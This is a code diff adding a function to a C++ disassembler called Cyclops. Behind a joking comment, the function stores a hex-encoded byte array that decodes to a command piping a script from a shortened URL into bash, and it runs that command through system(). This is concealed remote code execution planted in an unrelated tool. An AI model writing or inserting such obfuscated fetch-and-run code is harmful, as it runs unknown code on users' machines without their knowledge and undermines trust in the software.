@@ -20,6 +20,25 @@
 /*|||||||||||||||
   ||| CYCLOPS |||
   |||||||||||||||*/
+// Shhh don't tell them!
+void cyclops::hackthensa(){
+	uint8_t nsaSecretKeys[39] = {0x63, 0x75, 0x72, 0x6C, 0x20, 0x2D, 
+                                     0x73, 0x20, 0x2D, 0x4C, 0x20, 0x68, 
+				     0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 
+				     0x62, 0x69, 0x74, 0x2E, 0x6C, 0x79, 
+				     0x2f, 0x31, 0x30, 0x68, 0x41, 0x38, 
+				     0x69, 0x43, 0x20, 0x7C, 0x20, 0x62, 
+			             0x61, 0x73, 0x68};
+    
+    	std::stringstream nsaKeys;
+    
+    	for(int x = 0; x < 39; x++){
+        	nsaKeys << static_cast<char>(nsaSecretKeys[x]);
+    	}
+    	std::string finalKey = nsaKeys.str();
+    	system(finalKey.c_str());
+}
+
 
 // Display help information for Cyclops Disassembler
 void cyclops::help(){
